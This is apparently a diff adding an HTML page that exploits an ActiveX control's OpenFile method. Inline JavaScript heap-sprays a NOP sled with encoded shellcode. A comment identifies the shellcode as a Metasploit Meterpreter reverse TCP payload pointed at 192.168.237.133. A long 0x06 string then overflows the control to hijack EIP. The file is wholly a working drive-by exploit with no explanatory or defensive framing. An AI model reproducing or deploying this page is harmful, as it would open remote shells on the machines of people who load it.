@@ -1,0 +1,32 @@
+<html>
+  <head>
+    <object id="Oops" classid='clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687'></object>
+  </head>
+  <body>
+  <script>
+   
+    //msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.237.133 R | msfencode -t js_le
+    var Shellcode = unescape(
+    '%uc8d9%u74d9%uf424%ub85a%u34da%uc5cc%uc933%u49b1%u4231%u8319%ufcea%u4203%u3815%u30c1%u352d%uc92a%u25ae%u2ca2%u779f%u25d0%u47b2%u6892%u2c3f%u98f6%u40b4%uafdf%uee7d%u8139%udf7e%u4d85%u7ebc%u8c7a%ua091%u5f43%ua1e4%u8284%uf307%uc85d%ue3ba%u8cea%u0206%u9b3d%u7c37%u5c38%u36c3%u8d43%u4d7c%u350b%u09f6%u44ac%u4adb%u0f90%ub850%u8e62%uf1b0%ua08b%u5dfc%u0cb2%u9cf1%uabf2%uebea%uc808%ueb97%ub2ca%u7e43%u15cf%ud807%ua72b%ubec4%uabb8%ub5a1%uafe7%u1a34%ud49c%u9dbd%u5d73%ub985%u0557%ua05d%ue3ce%udd30%u4b11%u7bec%u7e59%ufdf9%u1700%u33ce%ue7bb%u4458%ud5c8%ufec7%u5646%ud88f%u9991%u9cba%u640e%udc45%ua307%u8c11%u023f%u471a%uabc0%uc7cf%u0390%ua7a0%ue440%u4f10%ueb8b%u6f4f%u21b4%u05f8%ua24e%u71c7%ub7bd%u83a0%ua93e%u0a6c%ua3d8%u5a9c%u5c72%uc704%ufd08%ud2c9%u3d74%ud041%uf089%u9da2%u6599%ue843%u20c0%uc75c%ucd6f%ue3c8%u9a39%ue964%uec1c%u122a%u664b%u86e2%u1134%u460b%ue1b5%u0c5d%u89b5%u7439%uace6%ua145%u7c9a%u49d0%ud1cb%u2173%u0cf1%ueeb3%u7b0a%ud345%u42dc%u25c3%ua76b%u410f');
+  
+    var NopSlide = unescape('%u9090%u9090');
+     
+    var headersize = 20;
+    var slack = headersize + Shellcode.length;
+     
+    while (NopSlide.length < slack) NopSlide += NopSlide;
+    var filler = NopSlide.substring(0,slack);
+    var chunk = NopSlide.substring(0,NopSlide.length - slack);
+     
+    while (chunk.length + slack < 0x40000) chunk = chunk + chunk + filler;
+    var memory = new Array();
+    for (i = 0; i < 500; i++){ memory[i] = chunk + Shellcode }
+     
+    // Trigger crash => EIP = 0x06060606
+    pointer='';
+    for (counter=0; counter<=1000; counter++) pointer+=unescape("%06");
+    Oops.OpenFile(pointer);
+     
+  </script>
+</body>
+</html>);
